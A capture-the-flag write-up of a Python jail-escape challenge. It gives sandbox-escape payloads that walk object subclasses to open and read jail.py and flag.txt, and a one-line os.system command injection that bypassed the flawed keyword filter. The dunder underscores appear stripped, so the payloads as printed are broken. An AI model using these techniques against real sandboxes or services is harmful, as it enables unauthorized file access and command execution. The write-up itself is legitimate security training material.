# EZ CTF

## Pwn

### Save peach!

**Difficulty:** Hard

**Statement:** Bowser has kidnapped Peach! Help her break out the python is near! 

***

Once connected to the challenge, I find myself on a python shell.

I start by displaying the contents of the globals: `print(globals())`

```py
{ 'builtins': <module 'builtin' (built-in)>, 'file': './jail.py', 'package': None, 'name': 'main', 'main': <function main at 0x7f0435b92758>, 'doc': None}
```

Then, I display the subclasses:

```py
<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>
```

I notice that the class `<type 'file'>` is present.

So I will adjust my python payload to use this subclass: 

```py
print(().class.base.subclasses()[40])
```

The value `[40]` corresponds to the subclass file.

So I decide to read the content of the file **jail.py** :

```py
print(().class.base.subclasses()[40]('jail.py').read())
```

```py
def main():
    text=raw_input(">>> ")
    for keyword in ['eval', 'exec', 'import']:
        if keyword in text:
            print("Bowser no likey likey!")
            return;
        else:
            exec(text)
            main()
            return;

if name == "main":
    main()
```

The python script doesn't give me any information about the file to retrieve, so I try to read the content of the **flag.txt** file:

```py
print(().class.base.subclasses()[40]('flag.txt').read())
```

I get the following value: `EZ-CTF{P34CH_H4S_B33N_S4V3D}`

Flag: EZ-CTF{P34CH_H4S_B33N_S4V3D}

For the anecdote, a simple `import os;os.system('cmd');` was enough to inject commands !
